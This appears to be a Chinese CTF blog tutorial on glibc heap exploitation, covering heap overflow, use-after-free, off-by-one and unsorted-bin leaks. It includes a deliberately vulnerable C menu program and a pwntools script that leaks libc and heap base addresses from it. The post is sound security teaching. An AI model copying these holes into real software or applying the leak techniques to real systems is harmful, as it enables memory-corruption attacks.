@@ -1,0 +1,965 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.png">
+  <link rel="icon" href="/img/icon.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="南行">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言了解了 Ptmalloc2 的内存管理机制后，我们就可以学习一下堆的利用基础。 堆相关的漏洞无法像栈那样直接劫持控制流，在堆中的漏洞利用一般通过修改堆上的函数指针，在程序调用堆上的数据的时候达成目的。 另一种是基于对堆分配的理解，达到任意地址分配从而实现任意地址写。通过任意地址写修改libc当中的一些hook来达到劫持程序控制流的目的。 堆常见漏洞堆溢出堆溢出是指程序向某个堆块中写入的字节数超">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Glibc堆利用入门">
+<meta property="og:url" content="http://nanhang.top/2025/07/01/ctf/heap/heap/index.html">
+<meta property="og:site_name" content="南行的一座山">
+<meta property="og:description" content="前言了解了 Ptmalloc2 的内存管理机制后，我们就可以学习一下堆的利用基础。 堆相关的漏洞无法像栈那样直接劫持控制流，在堆中的漏洞利用一般通过修改堆上的函数指针，在程序调用堆上的数据的时候达成目的。 另一种是基于对堆分配的理解，达到任意地址分配从而实现任意地址写。通过任意地址写修改libc当中的一些hook来达到劫持程序控制流的目的。 堆常见漏洞堆溢出堆溢出是指程序向某个堆块中写入的字节数超">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://nanhang.top/musl/assets/Pasted%20image%2020241203235534.png">
+<meta property="og:image" content="http://nanhang.top/musl/assets/Pasted%20image%2020250411165402.png">
+<meta property="og:image" content="http://nanhang.top/musl/assets/Pasted%20image%2020250411165442.png">
+<meta property="og:image" content="http://nanhang.top/musl/assets/Pasted%20image%2020250411165641.png">
+<meta property="og:image" content="http://nanhang.top/musl/assets/Pasted%20image%2020250411165755.png">
+<meta property="article:published_time" content="2025-07-01T01:48:01.000Z">
+<meta property="article:modified_time" content="2025-07-01T01:56:22.629Z">
+<meta property="article:author" content="南行">
+<meta property="article:tag" content="Heap">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://nanhang.top/musl/assets/Pasted%20image%2020241203235534.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Glibc堆利用入门 - 南行的一座山</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"nanhang.top","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="南行的一座山" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>南行的一座山</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/atom.xml" target="_self">
+                <i class="iconfont icon-rss"></i>
+                <span>RSS</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/banner.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Glibc堆利用入门"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-07-01 09:48" pubdate>
+          2025年7月1日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          32 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Glibc堆利用入门</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>了解了 Ptmalloc2 的内存管理机制后，我们就可以学习一下堆的利用基础。</p>
+<p>堆相关的漏洞无法像栈那样直接劫持控制流，在堆中的漏洞利用一般通过修改堆上的函数指针，在程序调用堆上的数据的时候达成目的。</p>
+<p>另一种是基于对堆分配的理解，达到任意地址分配从而实现任意地址写。通过任意地址写修改libc当中的一些hook来达到劫持程序控制流的目的。</p>
+<h2 id="堆常见漏洞"><a href="#堆常见漏洞" class="headerlink" title="堆常见漏洞"></a>堆常见漏洞</h2><h3 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h3><p>堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数（<strong>之所以是可使用而不是用户申请的字节数，是因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数</strong>），因而导致了数据溢出，并覆盖到<strong>物理相邻的高地址</strong>的下一个堆块。</p>
+<p>不难发现，堆溢出漏洞发生的基本前提是</p>
+<ul>
+<li><p>程序向堆上写入数据。</p>
+</li>
+<li><p>写入的数据大小没有被良好地控制。</p>
+</li>
+</ul>
+<p>对于攻击者来说，堆溢出漏洞轻则可以使得程序崩溃，重则可以使得攻击者控制程序执行流程。  </p>
+<p>堆溢出是一种特定的缓冲区溢出（还有栈溢出， bss 段溢出等）。但是其与栈溢出所不同的是，堆上并不存在返回地址等可以让攻击者直接控制执行流程的数据，因此我们一般无法直接通过堆溢出来控制 EIP 。一般来说，我们利用堆溢出的策略是</p>
+<ol>
+<li>覆盖与其<strong>物理相邻的下一个 chunk</strong> 的内容。<br>    - <code>prev_size</code><br>    - <code>size</code>，主要有三个比特位，以及该堆块真正的大小。<br>        - <code>NON_MAIN_ARENA</code><br>        - <code>IS_MAPPED</code><br>        - <code>PREV_INUSE</code><br>        - the True chunk size<br>    - chunk content，从而改变程序固有的执行流。</li>
+<li>利用堆中的机制（如 unlink 等 ）来实现任意地址写入（ Write-Anything-Anywhere）或控制堆块中的内容等效果，从而来控制程序的执行流。</li>
+</ol>
+<h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p>Use After Free 指的就是释放后使用：当一个指针所指向的指针块被释放掉之后可以再次被使用，但是这是有要求的。</p>
+<p>当一个内存被释放后重新使用有如下几种情况：</p>
+<ul>
+<li><code>chunk</code>被释放之后，其对应的指针被设置为<code>NULL</code>，如果再次使用它，程序就会崩溃。</li>
+<li><code>chunk</code>被释放之后，其对应的指针未被设置为<code>NULL</code>，如果在下一次使用之前没有代码对这块内存进行修改，那么再次使用这个指针时程序很有可能正常运转。</li>
+<li>内存块被释放后，其对应的指针没有被设置为<code>NULL</code>，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。</li>
+</ul>
+<p>在堆中 Use After Free 一般指的是后两种漏洞，我们一般称被释放后没有被设置为<code>NULL</code>的内存指针为<strong>dangling pointer（悬空指针、悬垂指针）</strong></p>
+<blockquote>
+<p>未被初始化过的内存指针称为野指针</p>
+</blockquote>
+<ul>
+<li>示例</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>	<span class="hljs-type">char</span> *p1;<br>	p1=(<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>)*<span class="hljs-number">0x10</span>);<br>	<span class="hljs-built_in">memcpy</span>(p1,<span class="hljs-string">&quot;hello&quot;</span>,<span class="hljs-number">10</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;p1 addr:%x,%s\n&quot;</span>,p1,p1);<br>	<span class="hljs-built_in">free</span>(p1);<br>	<span class="hljs-type">char</span> *p2;<br>	p2=(<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>)*<span class="hljs-number">0x10</span>);<br>	<span class="hljs-built_in">memcpy</span>(p2,<span class="hljs-string">&quot;world&quot;</span>,<span class="hljs-number">0x10</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;p2 addr:%x,%s\n&quot;</span>,p2,p1);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>如上代码，指针<code>p1</code>申请<code>0x10</code>内存，打印其地址，值。</p>
+<p>然后释放<code>p1</code></p>
+<p>指针<code>p2</code>申请同样大小的内存，打印<code>p2</code>的地址，<code>p1</code>指针指向的值</p>
+<p><code>p1</code>与<code>p2</code>地址相同，<code>p1</code>指针释放后，<code>p2</code>申请相同的大小的内存，操作系统会将之前给<code>p1</code>的地址分配给<code>p2</code>，修改<code>p2</code>的值，<code>p1</code>也被修改了。</p>
+<p>由此我们可以知道：</p>
+<ol>
+<li>在<code>free</code>一块内存后，接着申请大小相同的一块内存，操作系统会将刚刚free掉的内存再次分配，根本原因是<code>dlmalloc</code></li>
+</ol>
+<blockquote>
+<p>当应用程序调用<code>free()</code>释放内存时，如果内存块小于<code>256kb</code>，<code>dlmalloc</code>并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放回内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当<code>dlmalloc</code>中空闲内存量达到一定值时<code>dlmalloc</code>才将空闲内存释放回内核。如果应用程序申请的内存大于<code>256kb</code>，<code>dlmalloc</code>调用<code>mmap()</code>向内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于<code>256kb</code>，<code>dlmalloc</code>马上调用<code>munmap()</code>释放内存。<code>dlmalloc</code>不会缓存大于<code>256kb</code>的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。</p>
+</blockquote>
+<ol start="2">
+<li>通过<code>p2</code>能够操作<code>p1</code>，如果之后<code>p1</code>继续被使用（use after free），则可以达到通过<code>p2</code>修改程序功能等目的。</li>
+</ol>
+<p>常见利用：</p>
+<ul>
+<li>存在show的时候，可以考虑使用 unsorted bin配合 uaf 输出main_arena的地址，计算libc</li>
+<li>存在edit的时候，可以考虑使用大部分攻击手法</li>
+<li>无edit的时候，考虑double free</li>
+</ul>
+<p>纯粹的uaf漏洞并无法进行攻击。</p>
+<h3 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off-by-one"></a>off-by-one</h3><p>特殊的堆溢出漏洞，一字节溢出</p>
+<h3 id="off-by-null"><a href="#off-by-null" class="headerlink" title="off-by-null"></a>off-by-null</h3><p>off-by-null的利用比较苛刻，一般仅能选择使用 small bin的合并进行overlap。</p>
+<h2 id="unsorted-bin-leak"><a href="#unsorted-bin-leak" class="headerlink" title="unsorted bin leak"></a>unsorted bin leak</h2><p>由于 unsorted bin 是双向链表，因此在 unsorted bin 链表中必有一个节点的 <code>fd</code> 指针会指向 <code>main_arena</code> 结构体内部。如果我们可以把正确的 <code>fd</code> 指针 leak 出来，就可以获得一个与 <code>main_arena</code> 有固定偏移的地址，这个偏移可以通过调试得出。</p>
+<p><img src="/../../musl/assets/Pasted%20image%2020241203235534.png" srcset="/img/loading.gif" lazyload></p>
+<p>而<code>main_arena</code> 是一个 <code>struct malloc_state</code> 类型的全局变量，是 <code>ptmalloc</code> 管理主分配区的唯一实例。说到全局变量，立马可以想到他会被分配在 <code>.data</code> 或者 <code>.bss</code> 等段上，那么如果我们有进程所使用的 <code>libc</code> 的 <code>.so</code> 文件的话，我们就可以获得 <code>main_arena</code> 与 <code>libc</code> 基地址的偏移，从而获取 libc 的基地址。</p>
+<p><code>main_arena</code> 和 <code>__malloc_hook</code> 的地址差是 0x10，而大多数的 libc 都可以直接查出 <code>__malloc_hook</code> 的地址，这样可以大幅减小工作量。以 pwntools 为例</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">main_arena_offset = ELF(<span class="hljs-string">&quot;libc.so.6&quot;</span>).symbols[<span class="hljs-string">&quot;__malloc_hook&quot;</span>] + <span class="hljs-number">0x10</span><br></code></pre></td></tr></table></figure>
+
+<p>这样就可以获得 <code>main_arena</code> 与基地址的偏移了。</p>
+<p>示例程序：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">char</span> *chunk_list[<span class="hljs-number">0x100</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. add chunk&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. delete chunk&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3. edit chunk&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4. show chunk&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;5. exit&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;choice:&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_num</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x10</span>];<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-keyword">sizeof</span>(buf));<br>    <span class="hljs-keyword">return</span> atoi(buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add_chunk</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;index:&quot;</span>);<br>    <span class="hljs-type">int</span> index = get_num();<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;size:&quot;</span>);<br>    <span class="hljs-type">int</span> size = get_num();<br>    chunk_list[index] = <span class="hljs-built_in">malloc</span>(size);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">delete_chunk</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;index:&quot;</span>);<br>    <span class="hljs-type">int</span> index = get_num();<br>    <span class="hljs-built_in">free</span>(chunk_list[index]);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit_chunk</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;index:&quot;</span>);<br>    <span class="hljs-type">int</span> index = get_num();<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;length:&quot;</span>);<br>    <span class="hljs-type">int</span> length = get_num();<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;content:&quot;</span>);<br>    read(<span class="hljs-number">0</span>, chunk_list[index], length);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">show_chunk</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;index:&quot;</span>);<br>    <span class="hljs-type">int</span> index = get_num();<br>    <span class="hljs-built_in">puts</span>(chunk_list[index]);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        menu();<br>        <span class="hljs-keyword">switch</span> (get_num()) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: add_chunk(); <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>: delete_chunk(); <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>: edit_chunk(); <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>: show_chunk(); <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>: <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>: <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;invalid choice.&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>context(arch=elf.arch, os=elf.os)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = process([elf.path])<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_chunk</span>(<span class="hljs-params">index, size</span>):<br>    p.sendafter(<span class="hljs-string">&quot;choice:&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;index:&quot;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendafter(<span class="hljs-string">&quot;size:&quot;</span>, <span class="hljs-built_in">str</span>(size))<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_chunk</span>(<span class="hljs-params">index</span>):<br>    p.sendafter(<span class="hljs-string">&quot;choice:&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;index:&quot;</span>, <span class="hljs-built_in">str</span>(index))<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit_chunk</span>(<span class="hljs-params">index, content</span>):<br>    p.sendafter(<span class="hljs-string">&quot;choice:&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;index:&quot;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendafter(<span class="hljs-string">&quot;length:&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>    p.sendafter(<span class="hljs-string">&quot;content:&quot;</span>, content)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show_chunk</span>(<span class="hljs-params">index</span>):<br>    p.sendafter(<span class="hljs-string">&quot;choice:&quot;</span>, <span class="hljs-string">&quot;4&quot;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;index:&quot;</span>, <span class="hljs-built_in">str</span>(index))<br> <br>add_chunk(<span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>)<br>add_chunk(<span class="hljs-number">3</span>, <span class="hljs-number">0x20</span>)<br>add_chunk(<span class="hljs-number">1</span>, <span class="hljs-number">0x80</span>)<br>add_chunk(<span class="hljs-number">4</span>, <span class="hljs-number">0x20</span>)<br>add_chunk(<span class="hljs-number">2</span>, <span class="hljs-number">0x80</span>)<br>delete_chunk(<span class="hljs-number">0</span>)<br>delete_chunk(<span class="hljs-number">1</span>)<br>add_chunk(<span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>)<br>show_chunk(<span class="hljs-number">0</span>)<br>libc.address = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7F&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x39bb78</span><br>info(<span class="hljs-string">&quot;libc base: &quot;</span> + <span class="hljs-built_in">hex</span>(libc.address))<br>edit_chunk(<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">8</span>)<br>show_chunk(<span class="hljs-number">0</span>)<br>heap_base = u64(p.recvuntil((<span class="hljs-string">&#x27;\x55&#x27;</span>, <span class="hljs-string">&#x27;\x56&#x27;</span>))[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) &amp; ~<span class="hljs-number">0xFFF</span><br>info(<span class="hljs-string">&quot;heap base: &quot;</span> + <span class="hljs-built_in">hex</span>(heap_base))<br>gdb.attach(p)<br> <br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>通过堆溢出进行 unlink，然后造成任意地址写进行 getshell</p>
